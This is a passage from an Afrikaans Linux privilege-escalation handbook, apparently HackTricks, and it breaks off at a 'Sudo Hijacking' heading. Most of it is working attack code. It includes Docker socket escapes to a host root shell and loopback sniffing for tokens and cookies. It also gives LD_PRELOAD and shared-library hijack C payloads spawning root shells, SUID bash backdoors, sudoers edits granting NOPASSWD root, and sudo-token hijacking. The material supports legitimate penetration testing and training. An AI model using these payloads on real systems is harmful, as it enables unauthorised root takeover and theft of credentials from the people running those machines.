Die Docker socket, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Volgens verstek is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Besit van skryftoegang tot hierdie socket kan lei tot Privilege Escalation. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy skryftoegang tot die Docker socket het, kan jy escalate privileges deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om 'n container uit te voer met root-level access tot die host's file system.

#### **Gebruik Docker API direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket steeds gemanipuleer word deur die Docker API en `curl` opdragte te gebruik.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die host system's root directory mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuut geskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n konneksie met die container tot stand te bring, wat die uitvoering van opdragte binne dit moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat die `socat` konneksie opgestel is, kan jy opdragte direk in die container uitvoer met root-level access tot die host's filesystem.

### Ander

Let wel dat as jy skryf-permissies oor die docker socket het omdat jy **binne die group `docker` is** het jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy agterkom dat jy die **`ctr`** command kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om privileges te escalate**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy agterkom dat jy die **`runc`** command kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om privileges te escalate**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gevorderde **inter-Process Communication (IPC) system** wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Ontwerp met moderne Linux-stelsels in gedagte, bied dit 'n robuuste raamwerk vir verskeie vorme van toepassingkommunikasie.

Die stelsel is veelsydig en ondersteun basiese IPC wat die data-uitruiling tussen prosesse verbeter, soortgelyk aan **enhanced UNIX domain sockets**. Verder help dit met die uitsending van gebeurtenisse of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth daemon oor 'n inkomende oproep kan 'n music player laat demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n remote object system, wat diensversoeke en method invocations tussen toepassings vereenvoudig en prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n **allow/deny model**, wat boodskappermissies bestuur (method calls, signal emissions, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidreëls. Hierdie beleide spesifiseer interaksies met die bus, wat moontlik privilege escalation kan toelaat deur die uitbuiting van hierdie permissies.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat permissies uiteensit vir die root user om besit te hê, te stuur na, en boodskappe te ontvang van `fi.w1.wpa_supplicant1`.

Beleide sonder 'n gespesifiseerde user of group is universeel van toepassing, terwyl "default" context polisië van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus kommunikasie te enumerate en exploit hier:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en die posisie van die masjien uit te vind.

### Generiese enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Vinnige triage vir uitgaande filtrering

As die gasheer opdragte kan uitvoer, maar callbacks misluk, skei vinnig DNS-, transport-, proxy- en roete-filtrering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Kontroleer altyd die network services wat op die masjien loop en waarmee jy, voordat jy toegang daartoe gekry het, nie kon kommunikeer nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiseer listeners volgens bind target:

- `0.0.0.0` / `[::]`: blootgestel op alle plaaslike netwerkinterfaces.
- `127.0.0.1` / `::1`: local-only (goeie tunnel/forward-kandidate).
- Spesifieke interne IPs (bv. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): gewoonlik slegs bereikbaar vanaf interne segmente.

### Triage-werkvloei vir plaaslike dienste

Wanneer jy 'n host kompromitteer, word dienste wat aan `127.0.0.1` gebind is dikwels vir die eerste keer vanaf jou shell bereikbaar. 'n Vinnige plaaslike werkvloei is:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as 'n network scanner (network-only mode)

Benewens plaaslike PE checks, kan linPEAS as 'n gefokusde network scanner hardloop. Dit gebruik beskikbare binaries in `$PATH` (tipies `fping`, `ping`, `nc`, `ncat`) en installeer geen tooling nie.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
As jy `-d`, `-p` of `-i` sonder `-t` deurgee, gedra linPEAS homself as 'n suiwer network scanner (slaan die res van privilege-escalation checks oor).

### Sniffing

Kontroleer of jy verkeer kan sniff. As jy dit kan, kan jy moontlik sekere credentials kry.
```
timeout 1 tcpdump
```
Vinnige praktiese kontroles:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) is veral waardevol in post-exploitation omdat baie dienste wat slegs intern is tokens/cookies/credentials daar blootstel:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Vang nou, ontleed later:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

Kontroleer **who** jy is, watter **privileges** jy het, watter **users** in die stelsels is, watter van hulle kan **login** en watter van hulle het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om privileges te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Benut dit** met: **`systemd-run -t /bin/bash`**

### Groeppe

Kyk of jy 'n **lid van 'n groep** is wat jou root-privileges kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

Indien jy **enige wagwoord ken** van die omgewing, **probeer om as elke gebruiker aan te meld** met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te veroorsaak nie en die binaries `su` en `timeout` op die rekenaar beskikbaar is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH-misbruik

### $PATH

Indien jy agterkom dat jy kan **in 'n gids van die $PATH skryf**, mag jy dalk in staat wees om privileges te escalate deur 'n backdoor binne die skryfbare gids te skep met die naam van 'n kommando wat deur 'n ander gebruiker (ideaal root) uitgevoer sal word en wat **nie vanaf 'n gids gelaai word wat voor jou skryfbare gids in $PATH geleë is nie**.

### SUDO and SUID

Jy mag toegelaat wees om sekere kommando's met sudo uit te voer, of dit mag die suid-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om 'n kommando met 'n ander gebruiker se regte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer; dit is nou triviaal om 'n shell te kry deur 'n ssh key in die root-gids by te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **'n omgewingsvariabele te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om 'n ewekansige python-biblioteek te laai terwyl die script as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV behou deur sudo env_keep → root shell

As sudoers `BASH_ENV` bewaar (bv., `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om arbitrêre kode as root uit te voer wanneer 'n toegestane opdrag aangeroep word.

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en laai daardie lêer in voordat die teikenskrip uitgevoer word. Baie sudo-reëls laat toe om 'n skrip of 'n shell-wrapper uit te voer. As `BASH_ENV` deur sudo bewaar word, word jou lêer met root-bevoegdhede ingelaai.

- Vereistes:
- 'n sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`; verkies `env_reset`.
- Vermy shell-wrappers vir sudo-toegestane opdragte; gebruik minimale binaries.
- Oorweeg sudo I/O-logging en -waarskuwings wanneer bewaarde env vars gebruik word.

### Terraform via sudo met behoude HOME (!env_reset)

As sudo die omgewing onaangeraak laat (`!env_reset`) terwyl dit `terraform apply` toelaat, bly `$HOME` die oproepende gebruiker. Terraform laai daarom **$HOME/.terraformrc** as root en respekteer `provider_installation.dev_overrides`.

- Wys die vereiste provider na 'n skryfbare gids en plaas 'n kwaadwillige plugin met die naam van die provider (bv. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform sal die Go plugin handshake laat misluk, maar voer die payload as root uit voordat dit sterf, en laat 'n SUID shell agter.

### TF_VAR overrides + symlink validation bypass

Terraform veranderlikes kan verskaf word via die `TF_VAR_<name>` omgewingsveranderlikes, wat oorleef wanneer sudo die omgewing behou. Swak validerings soos `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` kan met symlinks omseil word:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform los die symlink op en kopieer die werklike `/root/root.txt` na 'n aanvaller-leesbare bestemming. Dieselfde benadering kan gebruik word om in bevoorregte paaie te **skryf** deur vooraf bestemmings-symlinks te skep (bv., deur die provider se bestemmingspad binne `/etc/cron.d/` aan te wys).

### requiretty / !requiretty

Op sommige ouer distribusies kan sudo gekonfigureer word met `requiretty`, wat sudo dwing om slegs in 'n interaktiewe TTY uitgevoer te word. As `!requiretty` ingestel is (of die opsie afwesig is), kan sudo vanaf nie-interaktiewe kontekste uitgevoer word, soos reverse shells, cron jobs, of scripts.
```bash
Defaults !requiretty
```
Dit is op sigself nie 'n direkte kwesbaarheid nie, maar dit brei die situasies uit waarin sudo-regels misbruik kan word sonder dat 'n volwaardige PTY benodig word.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

As `sudo -l` `env_keep+=PATH` wys of 'n `secure_path` wat aanvaller-skryfbare inskrywings bevat (bv. `/home/<user>/bin`), kan enige relatiewe opdrag binne die sudo-toegelate teiken geskadu word.

- Vereistes: 'n sudo-reël (dikwels `NOPASSWD`) wat 'n script/binary uitvoer wat opdragte sonder absolute paaie aanroep (`free`, `df`, `ps`, ens.) en 'n skryfbare PATH-inskrywing wat eerste deurgesoek word.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-uitvoering: omseil van paaie
**Gaan** lees ander lêers of gebruik **symlinks**. Byvoorbeeld in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sonder command path

As die **sudo permission** aan 'n enkele command gegee is **sonder om die path te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH variable te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **'n ander opdrag uitvoer sonder om die pad daartoe te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met opdragpad

As die **suid** binary **'n ander opdrag uitvoer en die pad spesifiseer**, dan kan jy probeer om **export 'n funksie** met dieselfde naam as die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binary _**/usr/sbin/service apache2 start**_ aanroep moet jy probeer om die funksie te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### Skryfbare script uitgevoer deur 'n SUID wrapper

'n Algemene custom-app-miskonfigurasie is 'n root-owned SUID binary wrapper wat 'n script uitvoer, terwyl die script self skryfbaar is deur low-priv users.

Tipiese patroon:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
As `/usr/local/bin/backup.sh` skryfbaar is, kan jy payload commands byvoeg en dan die SUID wrapper uitvoer:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vinnige kontroles:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Hierdie aanvalspad is veral algemeen in "maintenance"/"backup" wrappers wat in `/usr/local/bin` verskaf word.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer shared libraries (.so files) te spesifiseer wat deur die laaier voor al die ander gelaai word, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflading van 'n biblioteek.

Om stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die laaier ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruiker-ID (_ruid_) nie ooreenstem met die effektiewe gebruiker-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is voorafgelaai.

Privilege escalation kan gebeur as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike behoue bly en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde voorregte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Uiteindelik, **escalate privileges** uit te voer
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> ’n Soortgelyke privesc kan misbruik word as die attacker die **LD_LIBRARY_PATH** env variable beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy op 'n binary met **SUID** permissions afkom wat ongewone voorkom, is dit 'n goeie praktyk om te verifieer of dit **.so** files behoorlik laai. Dit kan nagegaan word deur die volgende command uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, wanneer 'n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ aangetref word, dui dit op 'n moontlikheid vir uitbuiting.

Om dit uit te buit, gaan mens voort deur 'n C-lêer te skep, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit saamgestel en uitgevoer is, poog om voorregte te verhoog deur lêertoestemmings te manipuleer en 'n shell met verhoogde voorregte uit te voer.

Kompileer die bogenoemde C-lêer in 'n shared object (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Laastens behoort die uitvoering van die aangetaste SUID binary die exploit te aktiveer, wat 'n potensiële stelselkompromittering moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Aangesien ons nou 'n SUID binary gevind het wat 'n library uit 'n gids laai waarin ons kan skryf, laat ons die library in daardie gids skep met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die library wat jy gegenereer het 'n funksie met die naam `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekuratoreerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **slegs argumente kan invoeg** in 'n command.

Die projek versamel legitieme funksies van Unix binaries wat misbruik kan word om uit beperkte shells te ontsnap, bevoegdhede te eskaleer of te behou, lêers oor te dra, bind and reverse shells te spawn, en ander post-exploitation take te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit vind hoe om enige sudo reël te exploit.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy bevoegdhede eskaleer deur **te wag vir 'n sudo command uitvoering en dan die session token te hijack**.

Vereistes om bevoegdhede te eskaleer:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15mins** (standaard is dit die duur van die sudo token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (jy kan dit oplaai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` te stel)

As al hierdie vereistes vervul is, **kan jy bevoegdhede eskaleer deur:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) sal die binary `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die **sudo token in jou sessie te aktiveer** (jy sal nie outomaties 'n root shell kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ skep wat **deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers file skep** wat **sudo tokens ewig maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **write permissions** in die vouer of op enige van die geskepte lêers binne die vouer het, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om 'n **sudo token vir 'n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **obtain sudo privileges** sonder om die password te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` konfigureer wie `sudo` kan gebruik en hoe. Hierdie lêers **kan standaard slegs deur gebruiker root en groep root gelees word**.\
**Indien** jy hierdie lêer kan **lees** kan jy moontlik **interessante inligting bekom**, en as jy enige lêer kan **skryf** sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissions te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binêre, soos `doas` vir OpenBSD — onthou om sy konfigurasie by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

